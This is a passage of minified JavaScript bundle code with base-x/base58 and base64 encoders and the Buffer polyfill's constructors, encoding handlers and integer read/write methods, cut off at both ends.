            for (var p = new Uint8Array(r + (o - d)), g = r; d !== o; )
              p[g++] = c[d++];
            return p;
          }
          return {
            encode: function (t) {
              if (
                (t instanceof Uint8Array ||
                  (ArrayBuffer.isView(t)
                    ? (t = new Uint8Array(t.buffer, t.byteOffset, t.byteLength))
                    : Array.isArray(t) && (t = Uint8Array.from(t))),
                !(t instanceof Uint8Array))
              )
                throw new TypeError("Expected Uint8Array");
              if (0 === t.length) return "";
              for (
                var n = 0, r = 0, i = 0, o = t.length;
                i !== o && 0 === t[i];

              )
                i++, n++;
              for (
                var l = ((o - i) * c + 1) >>> 0, u = new Uint8Array(l);
                i !== o;

              ) {
                for (
                  var f = t[i], h = 0, d = l - 1;
                  (0 !== f || h < r) && -1 !== d;
                  d--, h++
                )
                  (f += (256 * u[d]) >>> 0),
                    (u[d] = f % s >>> 0),
                    (f = (f / s) >>> 0);
                if (0 !== f) throw new Error("Non-zero carry");
                (r = h), i++;
              }
              for (var p = l - r; p !== l && 0 === u[p]; ) p++;
              for (var g = a.repeat(n); p < l; ++p) g += e.charAt(u[p]);
              return g;
            },
            decodeUnsafe: u,
            decode: function (e) {
              var t = u(e);
              if (t) return t;
              throw new Error("Non-base" + s + " character");
            },
          };
        };
      },
      2009: (e, t) => {
        "use strict";
        (t.byteLength = function (e) {
          var t = a(e),
            n = t[0],
            r = t[1];
          return (3 * (n + r)) / 4 - r;
        }),
          (t.toByteArray = function (e) {
            var t,
              n,
              o = a(e),
              s = o[0],
              l = o[1],
              c = new i(
                (function (e, t, n) {
                  return (3 * (t + n)) / 4 - n;
                })(0, s, l)
              ),
              u = 0,
              f = l > 0 ? s - 4 : s;
            for (n = 0; n < f; n += 4)
              (t =
                (r[e.charCodeAt(n)] << 18) |
                (r[e.charCodeAt(n + 1)] << 12) |
                (r[e.charCodeAt(n + 2)] << 6) |
                r[e.charCodeAt(n + 3)]),
                (c[u++] = (t >> 16) & 255),
                (c[u++] = (t >> 8) & 255),
                (c[u++] = 255 & t);
            2 === l &&
              ((t = (r[e.charCodeAt(n)] << 2) | (r[e.charCodeAt(n + 1)] >> 4)),
              (c[u++] = 255 & t));
            1 === l &&
              ((t =
                (r[e.charCodeAt(n)] << 10) |
                (r[e.charCodeAt(n + 1)] << 4) |
                (r[e.charCodeAt(n + 2)] >> 2)),
              (c[u++] = (t >> 8) & 255),
              (c[u++] = 255 & t));
            return c;
          }),
          (t.fromByteArray = function (e) {
            for (
              var t,
                r = e.length,
                i = r % 3,
                o = [],
                s = 16383,
                a = 0,
                c = r - i;
              a < c;
              a += s
            )
              o.push(l(e, a, a + s > c ? c : a + s));
            1 === i
              ? ((t = e[r - 1]), o.push(n[t >> 2] + n[(t << 4) & 63] + "=="))
              : 2 === i &&
                ((t = (e[r - 2] << 8) + e[r - 1]),
                o.push(n[t >> 10] + n[(t >> 4) & 63] + n[(t << 2) & 63] + "="));
            return o.join("");
          });
        for (
          var n = [],
            r = [],
            i = "undefined" !== typeof Uint8Array ? Uint8Array : Array,
            o =
              "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
            s = 0;
          s < 64;
          ++s
        )
          (n[s] = o[s]), (r[o.charCodeAt(s)] = s);
        function a(e) {
          var t = e.length;
          if (t % 4 > 0)
            throw new Error("Invalid string. Length must be a multiple of 4");
          var n = e.indexOf("=");
          return -1 === n && (n = t), [n, n === t ? 0 : 4 - (n % 4)];
        }
        function l(e, t, r) {
          for (var i, o, s = [], a = t; a < r; a += 3)
            (i =
              ((e[a] << 16) & 16711680) +
              ((e[a + 1] << 8) & 65280) +
              (255 & e[a + 2])),
              s.push(
                n[((o = i) >> 18) & 63] +
                  n[(o >> 12) & 63] +
                  n[(o >> 6) & 63] +
                  n[63 & o]
              );
          return s.join("");
        }
        (r["-".charCodeAt(0)] = 62), (r["_".charCodeAt(0)] = 63);
      },
      6315: (e, t, n) => {
        const r = n(2307);
        e.exports = r(
          "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
        );
      },
      9778: (e, t, n) => {
        "use strict";
        const r = n(2009),
          i = n(4038),
          o =
            "function" === typeof Symbol && "function" === typeof Symbol.for
              ? Symbol.for("nodejs.util.inspect.custom")
              : null;
        (t.lW = l), (t.h2 = 50);
        const s = 2147483647;
        function a(e) {
          if (e > s)
            throw new RangeError(
              'The value "' + e + '" is invalid for option "size"'
            );
          const t = new Uint8Array(e);
          return Object.setPrototypeOf(t, l.prototype), t;
        }
        function l(e, t, n) {
          if ("number" === typeof e) {
            if ("string" === typeof t)
              throw new TypeError(
                'The "string" argument must be of type string. Received type number'
              );
            return f(e);
          }
          return c(e, t, n);
        }
        function c(e, t, n) {
          if ("string" === typeof e)
            return (function (e, t) {
              ("string" === typeof t && "" !== t) || (t = "utf8");
              if (!l.isEncoding(t))
                throw new TypeError("Unknown encoding: " + t);
              const n = 0 | g(e, t);
              let r = a(n);
              const i = r.write(e, t);
              i !== n && (r = r.slice(0, i));
              return r;
            })(e, t);
          if (ArrayBuffer.isView(e))
            return (function (e) {
              if (Y(e, Uint8Array)) {
                const t = new Uint8Array(e);
                return d(t.buffer, t.byteOffset, t.byteLength);
              }
              return h(e);
            })(e);
          if (null == e)
            throw new TypeError(
              "The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " +
                typeof e
            );
          if (Y(e, ArrayBuffer) || (e && Y(e.buffer, ArrayBuffer)))
            return d(e, t, n);
          if (
            "undefined" !== typeof SharedArrayBuffer &&
            (Y(e, SharedArrayBuffer) || (e && Y(e.buffer, SharedArrayBuffer)))
          )
            return d(e, t, n);
          if ("number" === typeof e)
            throw new TypeError(
              'The "value" argument must not be of type number. Received type number'
            );
          const r = e.valueOf && e.valueOf();
          if (null != r && r !== e) return l.from(r, t, n);
          const i = (function (e) {
            if (l.isBuffer(e)) {
              const t = 0 | p(e.length),
                n = a(t);
              return 0 === n.length || e.copy(n, 0, 0, t), n;
            }
            if (void 0 !== e.length)
              return "number" !== typeof e.length || Z(e.length) ? a(0) : h(e);
            if ("Buffer" === e.type && Array.isArray(e.data)) return h(e.data);
          })(e);
          if (i) return i;
          if (
            "undefined" !== typeof Symbol &&
            null != Symbol.toPrimitive &&
            "function" === typeof e[Symbol.toPrimitive]
          )
            return l.from(e[Symbol.toPrimitive]("string"), t, n);
          throw new TypeError(
            "The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " +
              typeof e
          );
        }
        function u(e) {
          if ("number" !== typeof e)
            throw new TypeError('"size" argument must be of type number');
          if (e < 0)
            throw new RangeError(
              'The value "' + e + '" is invalid for option "size"'
            );
        }
        function f(e) {
          return u(e), a(e < 0 ? 0 : 0 | p(e));
        }
        function h(e) {
          const t = e.length < 0 ? 0 : 0 | p(e.length),
            n = a(t);
          for (let r = 0; r < t; r += 1) n[r] = 255 & e[r];
          return n;
        }
        function d(e, t, n) {
          if (t < 0 || e.byteLength < t)
            throw new RangeError('"offset" is outside of buffer bounds');
          if (e.byteLength < t + (n || 0))
            throw new RangeError('"length" is outside of buffer bounds');
          let r;
          return (
            (r =
              void 0 === t && void 0 === n
                ? new Uint8Array(e)
                : void 0 === n
                ? new Uint8Array(e, t)
                : new Uint8Array(e, t, n)),
            Object.setPrototypeOf(r, l.prototype),
            r
          );
        }
        function p(e) {
          if (e >= s)
            throw new RangeError(
              "Attempt to allocate Buffer larger than maximum size: 0x" +
                s.toString(16) +
                " bytes"
            );
          return 0 | e;
        }
        function g(e, t) {
          if (l.isBuffer(e)) return e.length;
          if (ArrayBuffer.isView(e) || Y(e, ArrayBuffer)) return e.byteLength;
          if ("string" !== typeof e)
            throw new TypeError(
              'The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type ' +
                typeof e
            );
          const n = e.length,
            r = arguments.length > 2 && !0 === arguments[2];
          if (!r && 0 === n) return 0;
          let i = !1;
          for (;;)
            switch (t) {
              case "ascii":
              case "latin1":
              case "binary":
                return n;
              case "utf8":
              case "utf-8":
                return V(e).length;
              case "ucs2":
              case "ucs-2":
              case "utf16le":
              case "utf-16le":
                return 2 * n;
              case "hex":
                return n >>> 1;
              case "base64":
                return q(e).length;
              default:
                if (i) return r ? -1 : V(e).length;
                (t = ("" + t).toLowerCase()), (i = !0);
            }
        }
        function y(e, t, n) {
          let r = !1;
          if (((void 0 === t || t < 0) && (t = 0), t > this.length)) return "";
          if (((void 0 === n || n > this.length) && (n = this.length), n <= 0))
            return "";
          if ((n >>>= 0) <= (t >>>= 0)) return "";
          for (e || (e = "utf8"); ; )
            switch (e) {
              case "hex":
                return B(this, t, n);
              case "utf8":
              case "utf-8":
                return T(this, t, n);
              case "ascii":
                return I(this, t, n);
              case "latin1":
              case "binary":
                return O(this, t, n);
              case "base64":
                return k(this, t, n);
              case "ucs2":
              case "ucs-2":
              case "utf16le":
              case "utf-16le":
                return P(this, t, n);
              default:
                if (r) throw new TypeError("Unknown encoding: " + e);
                (e = (e + "").toLowerCase()), (r = !0);
            }
        }
        function w(e, t, n) {
          const r = e[t];
          (e[t] = e[n]), (e[n] = r);
        }
        function m(e, t, n, r, i) {
          if (0 === e.length) return -1;
          if (
            ("string" === typeof n
              ? ((r = n), (n = 0))
              : n > 2147483647
              ? (n = 2147483647)
              : n < -2147483648 && (n = -2147483648),
            Z((n = +n)) && (n = i ? 0 : e.length - 1),
            n < 0 && (n = e.length + n),
            n >= e.length)
          ) {
            if (i) return -1;
            n = e.length - 1;
          } else if (n < 0) {
            if (!i) return -1;
            n = 0;
          }
          if (("string" === typeof t && (t = l.from(t, r)), l.isBuffer(t)))
            return 0 === t.length ? -1 : b(e, t, n, r, i);
          if ("number" === typeof t)
            return (
              (t &= 255),
              "function" === typeof Uint8Array.prototype.indexOf
                ? i
                  ? Uint8Array.prototype.indexOf.call(e, t, n)
                  : Uint8Array.prototype.lastIndexOf.call(e, t, n)
                : b(e, [t], n, r, i)
            );
          throw new TypeError("val must be string, number or Buffer");
        }
        function b(e, t, n, r, i) {
          let o,
            s = 1,
            a = e.length,
            l = t.length;
          if (
            void 0 !== r &&
            ("ucs2" === (r = String(r).toLowerCase()) ||
              "ucs-2" === r ||
              "utf16le" === r ||
              "utf-16le" === r)
          ) {
            if (e.length < 2 || t.length < 2) return -1;
            (s = 2), (a /= 2), (l /= 2), (n /= 2);
          }
          function c(e, t) {
            return 1 === s ? e[t] : e.readUInt16BE(t * s);
          }
          if (i) {
            let r = -1;
            for (o = n; o < a; o++)
              if (c(e, o) === c(t, -1 === r ? 0 : o - r)) {
                if ((-1 === r && (r = o), o - r + 1 === l)) return r * s;
              } else -1 !== r && (o -= o - r), (r = -1);
          } else
            for (n + l > a && (n = a - l), o = n; o >= 0; o--) {
              let n = !0;
              for (let r = 0; r < l; r++)
                if (c(e, o + r) !== c(t, r)) {
                  n = !1;
                  break;
                }
              if (n) return o;
            }
          return -1;
        }
        function v(e, t, n, r) {
          n = Number(n) || 0;
          const i = e.length - n;
          r ? (r = Number(r)) > i && (r = i) : (r = i);
          const o = t.length;
          let s;
          for (r > o / 2 && (r = o / 2), s = 0; s < r; ++s) {
            const r = parseInt(t.substr(2 * s, 2), 16);
            if (Z(r)) return s;
            e[n + s] = r;
          }
          return s;
        }
        function E(e, t, n, r) {
          return G(V(t, e.length - n), e, n, r);
        }
        function S(e, t, n, r) {
          return G(
            (function (e) {
              const t = [];
              for (let n = 0; n < e.length; ++n) t.push(255 & e.charCodeAt(n));
              return t;
            })(t),
            e,
            n,
            r
          );
        }
        function x(e, t, n, r) {
          return G(q(t), e, n, r);
        }
        function A(e, t, n, r) {
          return G(
            (function (e, t) {
              let n, r, i;
              const o = [];
              for (let s = 0; s < e.length && !((t -= 2) < 0); ++s)
                (n = e.charCodeAt(s)),
                  (r = n >> 8),
                  (i = n % 256),
                  o.push(i),
                  o.push(r);
              return o;
            })(t, e.length - n),
            e,
            n,
            r
          );
        }
        function k(e, t, n) {
          return 0 === t && n === e.length
            ? r.fromByteArray(e)
            : r.fromByteArray(e.slice(t, n));
        }
        function T(e, t, n) {
          n = Math.min(e.length, n);
          const r = [];
          let i = t;
          for (; i < n; ) {
            const t = e[i];
            let o = null,
              s = t > 239 ? 4 : t > 223 ? 3 : t > 191 ? 2 : 1;
            if (i + s <= n) {
              let n, r, a, l;
              switch (s) {
                case 1:
                  t < 128 && (o = t);
                  break;
                case 2:
                  (n = e[i + 1]),
                    128 === (192 & n) &&
                      ((l = ((31 & t) << 6) | (63 & n)), l > 127 && (o = l));
                  break;
                case 3:
                  (n = e[i + 1]),
                    (r = e[i + 2]),
                    128 === (192 & n) &&
                      128 === (192 & r) &&
                      ((l = ((15 & t) << 12) | ((63 & n) << 6) | (63 & r)),
                      l > 2047 && (l < 55296 || l > 57343) && (o = l));
                  break;
                case 4:
                  (n = e[i + 1]),
                    (r = e[i + 2]),
                    (a = e[i + 3]),
                    128 === (192 & n) &&
                      128 === (192 & r) &&
                      128 === (192 & a) &&
                      ((l =
                        ((15 & t) << 18) |
                        ((63 & n) << 12) |
                        ((63 & r) << 6) |
                        (63 & a)),
                      l > 65535 && l < 1114112 && (o = l));
              }
            }
            null === o
              ? ((o = 65533), (s = 1))
              : o > 65535 &&
                ((o -= 65536),
                r.push(((o >>> 10) & 1023) | 55296),
                (o = 56320 | (1023 & o))),
              r.push(o),
              (i += s);
          }
          return (function (e) {
            const t = e.length;
            if (t <= C) return String.fromCharCode.apply(String, e);
            let n = "",
              r = 0;
            for (; r < t; )
              n += String.fromCharCode.apply(String, e.slice(r, (r += C)));
            return n;
          })(r);
        }
        (l.TYPED_ARRAY_SUPPORT = (function () {
          try {
            const e = new Uint8Array(1),
              t = {
                foo: function () {
                  return 42;
                },
              };
            return (
              Object.setPrototypeOf(t, Uint8Array.prototype),
              Object.setPrototypeOf(e, t),
              42 === e.foo()
            );
          } catch (e) {
            return !1;
          }
        })()),
          l.TYPED_ARRAY_SUPPORT ||
            "undefined" === typeof console ||
            "function" !== typeof console.error ||
            console.error(
              "This browser lacks typed array (Uint8Array) support which is required by `buffer` v5.x. Use `buffer` v4.x if you require old browser support."
            ),
          Object.defineProperty(l.prototype, "parent", {
            enumerable: !0,
            get: function () {
              if (l.isBuffer(this)) return this.buffer;
            },
          }),
          Object.defineProperty(l.prototype, "offset", {
            enumerable: !0,
            get: function () {
              if (l.isBuffer(this)) return this.byteOffset;
            },
          }),
          (l.poolSize = 8192),
          (l.from = function (e, t, n) {
            return c(e, t, n);
          }),
          Object.setPrototypeOf(l.prototype, Uint8Array.prototype),
          Object.setPrototypeOf(l, Uint8Array),
          (l.alloc = function (e, t, n) {
            return (function (e, t, n) {
              return (
                u(e),
                e <= 0
                  ? a(e)
                  : void 0 !== t
                  ? "string" === typeof n
                    ? a(e).fill(t, n)
                    : a(e).fill(t)
                  : a(e)
              );
            })(e, t, n);
          }),
          (l.allocUnsafe = function (e) {
            return f(e);
          }),
          (l.allocUnsafeSlow = function (e) {
            return f(e);
          }),
          (l.isBuffer = function (e) {
            return null != e && !0 === e._isBuffer && e !== l.prototype;
          }),
          (l.compare = function (e, t) {
            if (
              (Y(e, Uint8Array) && (e = l.from(e, e.offset, e.byteLength)),
              Y(t, Uint8Array) && (t = l.from(t, t.offset, t.byteLength)),
              !l.isBuffer(e) || !l.isBuffer(t))
            )
              throw new TypeError(
                'The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array'
              );
            if (e === t) return 0;
            let n = e.length,
              r = t.length;
            for (let i = 0, o = Math.min(n, r); i < o; ++i)
              if (e[i] !== t[i]) {
                (n = e[i]), (r = t[i]);
                break;
              }
            return n < r ? -1 : r < n ? 1 : 0;
          }),
          (l.isEncoding = function (e) {
            switch (String(e).toLowerCase()) {
              case "hex":
              case "utf8":
              case "utf-8":
              case "ascii":
              case "latin1":
              case "binary":
              case "base64":
              case "ucs2":
              case "ucs-2":
              case "utf16le":
              case "utf-16le":
                return !0;
              default:
                return !1;
            }
          }),
          (l.concat = function (e, t) {
            if (!Array.isArray(e))
              throw new TypeError(
                '"list" argument must be an Array of Buffers'
              );
            if (0 === e.length) return l.alloc(0);
            let n;
            if (void 0 === t)
              for (t = 0, n = 0; n < e.length; ++n) t += e[n].length;
            const r = l.allocUnsafe(t);
            let i = 0;
            for (n = 0; n < e.length; ++n) {
              let t = e[n];
              if (Y(t, Uint8Array))
                i + t.length > r.length
                  ? (l.isBuffer(t) || (t = l.from(t)), t.copy(r, i))
                  : Uint8Array.prototype.set.call(r, t, i);
              else {
                if (!l.isBuffer(t))
                  throw new TypeError(
                    '"list" argument must be an Array of Buffers'
                  );
                t.copy(r, i);
              }
              i += t.length;
            }
            return r;
          }),
          (l.byteLength = g),
          (l.prototype._isBuffer = !0),
          (l.prototype.swap16 = function () {
            const e = this.length;
            if (e % 2 !== 0)
              throw new RangeError("Buffer size must be a multiple of 16-bits");
            for (let t = 0; t < e; t += 2) w(this, t, t + 1);
            return this;
          }),
          (l.prototype.swap32 = function () {
            const e = this.length;
            if (e % 4 !== 0)
              throw new RangeError("Buffer size must be a multiple of 32-bits");
            for (let t = 0; t < e; t += 4)
              w(this, t, t + 3), w(this, t + 1, t + 2);
            return this;
          }),
          (l.prototype.swap64 = function () {
            const e = this.length;
            if (e % 8 !== 0)
              throw new RangeError("Buffer size must be a multiple of 64-bits");
            for (let t = 0; t < e; t += 8)
              w(this, t, t + 7),
                w(this, t + 1, t + 6),
                w(this, t + 2, t + 5),
                w(this, t + 3, t + 4);
            return this;
          }),
          (l.prototype.toString = function () {
            const e = this.length;
            return 0 === e
              ? ""
              : 0 === arguments.length
              ? T(this, 0, e)
              : y.apply(this, arguments);
          }),
          (l.prototype.toLocaleString = l.prototype.toString),
          (l.prototype.equals = function (e) {
            if (!l.isBuffer(e))
              throw new TypeError("Argument must be a Buffer");
            return this === e || 0 === l.compare(this, e);
          }),
          (l.prototype.inspect = function () {
            let e = "";
            const n = t.h2;
            return (
              (e = this.toString("hex", 0, n)
                .replace(/(.{2})/g, "$1 ")
                .trim()),
              this.length > n && (e += " ... "),
              "<Buffer " + e + ">"
            );
          }),
          o && (l.prototype[o] = l.prototype.inspect),
          (l.prototype.compare = function (e, t, n, r, i) {
            if (
              (Y(e, Uint8Array) && (e = l.from(e, e.offset, e.byteLength)),
              !l.isBuffer(e))
            )
              throw new TypeError(
                'The "target" argument must be one of type Buffer or Uint8Array. Received type ' +
                  typeof e
              );
            if (
              (void 0 === t && (t = 0),
              void 0 === n && (n = e ? e.length : 0),
              void 0 === r && (r = 0),
              void 0 === i && (i = this.length),
              t < 0 || n > e.length || r < 0 || i > this.length)
            )
              throw new RangeError("out of range index");
            if (r >= i && t >= n) return 0;
            if (r >= i) return -1;
            if (t >= n) return 1;
            if (this === e) return 0;
            let o = (i >>>= 0) - (r >>>= 0),
              s = (n >>>= 0) - (t >>>= 0);
            const a = Math.min(o, s),
              c = this.slice(r, i),
              u = e.slice(t, n);
            for (let l = 0; l < a; ++l)
              if (c[l] !== u[l]) {
                (o = c[l]), (s = u[l]);
                break;
              }
            return o < s ? -1 : s < o ? 1 : 0;
          }),
          (l.prototype.includes = function (e, t, n) {
            return -1 !== this.indexOf(e, t, n);
          }),
          (l.prototype.indexOf = function (e, t, n) {
            return m(this, e, t, n, !0);
          }),
          (l.prototype.lastIndexOf = function (e, t, n) {
            return m(this, e, t, n, !1);
          }),
          (l.prototype.write = function (e, t, n, r) {
            if (void 0 === t) (r = "utf8"), (n = this.length), (t = 0);
            else if (void 0 === n && "string" === typeof t)
              (r = t), (n = this.length), (t = 0);
            else {
              if (!isFinite(t))
                throw new Error(
                  "Buffer.write(string, encoding, offset[, length]) is no longer supported"
                );
              (t >>>= 0),
                isFinite(n)
                  ? ((n >>>= 0), void 0 === r && (r = "utf8"))
                  : ((r = n), (n = void 0));
            }
            const i = this.length - t;
            if (
              ((void 0 === n || n > i) && (n = i),
              (e.length > 0 && (n < 0 || t < 0)) || t > this.length)
            )
              throw new RangeError("Attempt to write outside buffer bounds");
            r || (r = "utf8");
            let o = !1;
            for (;;)
              switch (r) {
                case "hex":
                  return v(this, e, t, n);
                case "utf8":
                case "utf-8":
                  return E(this, e, t, n);
                case "ascii":
                case "latin1":
                case "binary":
                  return S(this, e, t, n);
                case "base64":
                  return x(this, e, t, n);
                case "ucs2":
                case "ucs-2":
                case "utf16le":
                case "utf-16le":
                  return A(this, e, t, n);
                default:
                  if (o) throw new TypeError("Unknown encoding: " + r);
                  (r = ("" + r).toLowerCase()), (o = !0);
              }
          }),
          (l.prototype.toJSON = function () {
            return {
              type: "Buffer",
              data: Array.prototype.slice.call(this._arr || this, 0),
            };
          });
        const C = 4096;
        function I(e, t, n) {
          let r = "";
          n = Math.min(e.length, n);
          for (let i = t; i < n; ++i) r += String.fromCharCode(127 & e[i]);
          return r;
        }
        function O(e, t, n) {
          let r = "";
          n = Math.min(e.length, n);
          for (let i = t; i < n; ++i) r += String.fromCharCode(e[i]);
          return r;
        }
        function B(e, t, n) {
          const r = e.length;
          (!t || t < 0) && (t = 0), (!n || n < 0 || n > r) && (n = r);
          let i = "";
          for (let o = t; o < n; ++o) i += J[e[o]];
          return i;
        }
        function P(e, t, n) {
          const r = e.slice(t, n);
          let i = "";
          for (let o = 0; o < r.length - 1; o += 2)
            i += String.fromCharCode(r[o] + 256 * r[o + 1]);
          return i;
        }
        function _(e, t, n) {
          if (e % 1 !== 0 || e < 0) throw new RangeError("offset is not uint");
          if (e + t > n)
            throw new RangeError("Trying to access beyond buffer length");
        }
        function U(e, t, n, r, i, o) {
          if (!l.isBuffer(e))
            throw new TypeError('"buffer" argument must be a Buffer instance');
          if (t > i || t < o)
            throw new RangeError('"value" argument is out of bounds');
          if (n + r > e.length) throw new RangeError("Index out of range");
        }
        function N(e, t, n, r, i) {
          j(t, r, i, e, n, 7);
          let o = Number(t & BigInt(4294967295));
          (e[n++] = o),
            (o >>= 8),
            (e[n++] = o),
            (o >>= 8),
            (e[n++] = o),
            (o >>= 8),
            (e[n++] = o);
          let s = Number((t >> BigInt(32)) & BigInt(4294967295));
          return (
            (e[n++] = s),
            (s >>= 8),
            (e[n++] = s),
            (s >>= 8),
            (e[n++] = s),
            (s >>= 8),
            (e[n++] = s),
            n
          );
        }
        function R(e, t, n, r, i) {
          j(t, r, i, e, n, 7);
          let o = Number(t & BigInt(4294967295));
          (e[n + 7] = o),
            (o >>= 8),
            (e[n + 6] = o),
            (o >>= 8),
            (e[n + 5] = o),
            (o >>= 8),
            (e[n + 4] = o);
          let s = Number((t >> BigInt(32)) & BigInt(4294967295));
          return (
            (e[n + 3] = s),
            (s >>= 8),
            (e[n + 2] = s),
            (s >>= 8),
            (e[n + 1] = s),
            (s >>= 8),
            (e[n] = s),
            n + 8
          );
        }
        function L(e, t, n, r, i, o) {
          if (n + r > e.length) throw new RangeError("Index out of range");
          if (n < 0) throw new RangeError("Index out of range");
        }
        function $(e, t, n, r, o) {
          return (
            (t = +t),
            (n >>>= 0),
            o || L(e, 0, n, 4),
            i.write(e, t, n, r, 23, 4),
            n + 4
          );
        }
        function H(e, t, n, r, o) {
          return (
            (t = +t),
            (n >>>= 0),
            o || L(e, 0, n, 8),
            i.write(e, t, n, r, 52, 8),
            n + 8
          );
        }
        (l.prototype.slice = function (e, t) {
          const n = this.length;
          (e = ~~e) < 0 ? (e += n) < 0 && (e = 0) : e > n && (e = n),
            (t = void 0 === t ? n : ~~t) < 0
              ? (t += n) < 0 && (t = 0)
              : t > n && (t = n),
            t < e && (t = e);
          const r = this.subarray(e, t);
          return Object.setPrototypeOf(r, l.prototype), r;
        }),
          (l.prototype.readUintLE = l.prototype.readUIntLE =
            function (e, t, n) {
              (e >>>= 0), (t >>>= 0), n || _(e, t, this.length);
              let r = this[e],
                i = 1,
                o = 0;
              for (; ++o < t && (i *= 256); ) r += this[e + o] * i;
              return r;
            }),
          (l.prototype.readUintBE = l.prototype.readUIntBE =
            function (e, t, n) {
              (e >>>= 0), (t >>>= 0), n || _(e, t, this.length);
              let r = this[e + --t],
                i = 1;
              for (; t > 0 && (i *= 256); ) r += this[e + --t] * i;
              return r;
            }),
          (l.prototype.readUint8 = l.prototype.readUInt8 =
            function (e, t) {
              return (e >>>= 0), t || _(e, 1, this.length), this[e];
            }),
          (l.prototype.readUint16LE = l.prototype.readUInt16LE =
            function (e, t) {
              return (
                (e >>>= 0),
                t || _(e, 2, this.length),
                this[e] | (this[e + 1] << 8)
              );
            }),
          (l.prototype.readUint16BE = l.prototype.readUInt16BE =
            function (e, t) {
              return (
                (e >>>= 0),
                t || _(e, 2, this.length),
                (this[e] << 8) | this[e + 1]
              );
            }),
          (l.prototype.readUint32LE = l.prototype.readUInt32LE =
            function (e, t) {
              return (
                (e >>>= 0),
                t || _(e, 4, this.length),
                (this[e] | (this[e + 1] << 8) | (this[e + 2] << 16)) +
                  16777216 * this[e + 3]
              );
            }),
          (l.prototype.readUint32BE = l.prototype.readUInt32BE =
            function (e, t) {
              return (
                (e >>>= 0),
                t || _(e, 4, this.length),
                16777216 * this[e] +
                  ((this[e + 1] << 16) | (this[e + 2] << 8) | this[e + 3])
              );
            }),
          (l.prototype.readBigUInt64LE = X(function (e) {
            z((e >>>= 0), "offset");
            const t = this[e],
              n = this[e + 7];
            (void 0 !== t && void 0 !== n) || K(e, this.length - 8);
            const r =
                t + 256 * this[++e] + 65536 * this[++e] + this[++e] * 2 ** 24,
              i = this[++e] + 256 * this[++e] + 65536 * this[++e] + n * 2 ** 24;
            return BigInt(r) + (BigInt(i) << BigInt(32));
          })),
          (l.prototype.readBigUInt64BE = X(function (e) {
            z((e >>>= 0), "offset");
            const t = this[e],
              n = this[e + 7];
            (void 0 !== t && void 0 !== n) || K(e, this.length - 8);
            const r =
                t * 2 ** 24 + 65536 * this[++e] + 256 * this[++e] + this[++e],
              i = this[++e] * 2 ** 24 + 65536 * this[++e] + 256 * this[++e] + n;
            return (BigInt(r) << BigInt(32)) + BigInt(i);
          })),
          (l.prototype.readIntLE = function (e, t, n) {
            (e >>>= 0), (t >>>= 0), n || _(e, t, this.length);
            let r = this[e],
              i = 1,
              o = 0;
            for (; ++o < t && (i *= 256); ) r += this[e + o] * i;
            return (i *= 128), r >= i && (r -= Math.pow(2, 8 * t)), r;
          }),
          (l.prototype.readIntBE = function (e, t, n) {
            (e >>>= 0), (t >>>= 0), n || _(e, t, this.length);
            let r = t,
              i = 1,
              o = this[e + --r];
            for (; r > 0 && (i *= 256); ) o += this[e + --r] * i;
            return (i *= 128), o >= i && (o -= Math.pow(2, 8 * t)), o;
          }),
          (l.prototype.readInt8 = function (e, t) {
            return (
              (e >>>= 0),
              t || _(e, 1, this.length),
              128 & this[e] ? -1 * (255 - this[e] + 1) : this[e]
            );
          }),
          (l.prototype.readInt16LE = function (e, t) {
            (e >>>= 0), t || _(e, 2, this.length);
            const n = this[e] | (this[e + 1] << 8);
            return 32768 & n ? 4294901760 | n : n;
          }),
          (l.prototype.readInt16BE = function (e, t) {
            (e >>>= 0), t || _(e, 2, this.length);
            const n = this[e + 1] | (this[e] << 8);
            return 32768 & n ? 4294901760 | n : n;
          }),
          (l.prototype.readInt32LE = function (e, t) {
            return (
              (e >>>= 0),
              t || _(e, 4, this.length),
              this[e] |
                (this[e + 1] << 8) |
                (this[e + 2] << 16) |
                (this[e + 3] << 24)
            );
          }),
          (l.prototype.readInt32BE = function (e, t) {
            return (
              (e >>>= 0),
              t || _(e, 4, this.length),
              (this[e] << 24) |
                (this[e + 1] << 16) |
                (this[e + 2] << 8) |
                this[e + 3]
            );
          }),
          (l.prototype.readBigInt64LE = X(function (e) {
            z((e >>>= 0), "offset");
            const t = this[e],
              n = this[e + 7];
            (void 0 !== t && void 0 !== n) || K(e, this.length - 8);
            const r =
              this[e + 4] + 256 * this[e + 5] + 65536 * this[e + 6] + (n << 24);
            return (
              (BigInt(r) << BigInt(32)) +
              BigInt(
                t + 256 * this[++e] + 65536 * this[++e] + this[++e] * 2 ** 24
              )
            );
          })),
          (l.prototype.readBigInt64BE = X(function (e) {
            z((e >>>= 0), "offset");
            const t = this[e],
              n = this[e + 7];
            (void 0 !== t && void 0 !== n) || K(e, this.length - 8);
            const r =
              (t << 24) + 65536 * this[++e] + 256 * this[++e] + this[++e];
            return (
              (BigInt(r) << BigInt(32)) +
              BigInt(
                this[++e] * 2 ** 24 + 65536 * this[++e] + 256 * this[++e] + n
              )
            );
          })),
          (l.prototype.readFloatLE = function (e, t) {
            return (
              (e >>>= 0), t || _(e, 4, this.length), i.read(this, e, !0, 23, 4)
            );
          }),
          (l.prototype.readFloatBE = function (e, t) {
            return (
              (e >>>= 0), t || _(e, 4, this.length), i.read(this, e, !1, 23, 4)
            );
          }),
          (l.prototype.readDoubleLE = function (e, t) {
            return (
              (e >>>= 0), t || _(e, 8, this.length), i.read(this, e, !0, 52, 8)
            );
          }),
          (l.prototype.readDoubleBE = function (e, t) {
            return (
              (e >>>= 0), t || _(e, 8, this.length), i.read(this, e, !1, 52, 8)
            );
          }),
          (l.prototype.writeUintLE = l.prototype.writeUIntLE =
            function (e, t, n, r) {
              if (((e = +e), (t >>>= 0), (n >>>= 0), !r)) {
                U(this, e, t, n, Math.pow(2, 8 * n) - 1, 0);
              }
              let i = 1,
                o = 0;
              for (this[t] = 255 & e; ++o < n && (i *= 256); )
                this[t + o] = (e / i) & 255;
              return t + n;
            }),
          (l.prototype.writeUintBE = l.prototype.writeUIntBE =
            function (e, t, n, r) {
              if (((e = +e), (t >>>= 0), (n >>>= 0), !r)) {
                U(this, e, t, n, Math.pow(2, 8 * n) - 1, 0);
              }
              let i = n - 1,
                o = 1;
